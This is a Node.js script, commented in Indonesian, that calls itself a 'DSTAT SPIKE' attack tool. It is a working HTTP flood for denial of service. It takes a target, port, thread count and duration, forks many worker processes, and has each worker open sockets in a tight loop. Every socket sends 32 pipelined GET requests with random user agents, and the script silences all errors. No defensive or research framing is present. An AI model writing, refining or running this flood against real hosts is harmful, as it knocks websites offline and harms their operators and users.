const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');

// Fungsi untuk memeriksa dan memperbaiki URL
function formatURL(targetInput) {
    // Jika sudah ada http:// atau https://, biarkan apa adanya
    if (targetInput.startsWith('http://') || targetInput.startsWith('https://')) {
        return targetInput;
    }
    
    // Jika input hanya berupa IP atau domain tanpa protokol, tambahkan http://
    return 'http://' + targetInput;
}

// Cek argumen
if (process.argv.length <= 4) {
    console.log("\x1b[36m╔════════════════════════════════════════════════════╗");
    console.log("║         \x1b[31mDSTAT SPIKE DANDIER ATTACK TOOL\x1b[36m          ║");
    console.log("╠════════════════════════════════════════════════════╣");
    console.log("║ \x1b[37mPenggunaan: node spike.js <url> <port> <threads> <time>\x1b[36m ║");
    console.log("╚════════════════════════════════════════════════════╝\x1b[0m");
    process.exit(-1);
}

// Ambil dan format target URL
var targetInput = process.argv[2];
var formattedTarget = formatURL(targetInput);
var parsed = url.parse(formattedTarget);
var host = parsed.host;
var port = parseInt(process.argv[3]);
var threads = process.argv[4];
var time = process.argv[5];

// Validasi port
if (isNaN(port) || port <= 0 || port > 65535) {
    console.log('\x1b[33m[!] Port tidak valid, menggunakan port default (80)\x1b[0m');
    port = 80;
}

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
process.on('uncaughtException', function (e) { });
process.on('unhandledRejection', function (e) { });

// Load user agents
let userAgents = [];
try {
    userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (err) {
    console.error('\x1b[31m╔════════════════════════════════════════════╗');
    console.error('║      DSTAT ERROR: Kurang file ua.txt!      ║');
    console.error('╚════════════════════════════════════════════╝\x1b[0m');
    process.exit(-1);
}

const nullHexs = [
    "\x00",
    "\xFF",
    "\xC2",
    "\xA0"
];

if (cluster.isMaster) {
    console.clear();
    console.log('\x1b[36m╔════════════════════════════════════════════╗');
    console.log('║        \x1b[31mDSTAT SPIKE DANDIER ATTACK\x1b[36m         ║');
    console.log('╠════════════════════════════════════════════╣');
    console.log(`║ \x1b[37mTarget: ${formattedTarget}\x1b[36m`);
    console.log(`║ \x1b[37mPort: ${port}\x1b[36m`);
    console.log(`║ \x1b[37mThreads: ${threads}\x1b[36m`);
    console.log(`║ \x1b[37mDurasi: ${time} detik\x1b[36m`);
    console.log('╚════════════════════════════════════════════╝\x1b[0m');

    // Fork threads
    for(let i = 0; i < threads; i++) {
        cluster.fork({PORT: port});
    }

    console.log(`\x1b[33m[!] \x1b[37mSerangan sedang berlangsung...\x1b[0m`);
    
    setTimeout(() => {
        console.log(`\x1b[32m[✓] \x1b[37mSerangan selesai!\x1b[0m`);
        process.exit(1);
    }, time * 1000);
} else {
    startflood();
}

function startflood() {
    const port = process.env.PORT || port;
    var int = setInterval(() => {
        var s = require('net').Socket();
        s.connect(port, host);
        s.setTimeout(10000);
        for (var i = 0; i < 32; i++) {
            s.write('GET ' + formattedTarget + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        }
        s.on('data', function () {
            setTimeout(function () {
                s.destroy();
                return delete s;
            }, 5000);
        });
    });
    setTimeout(() => clearInterval(int), time * 1000);
}
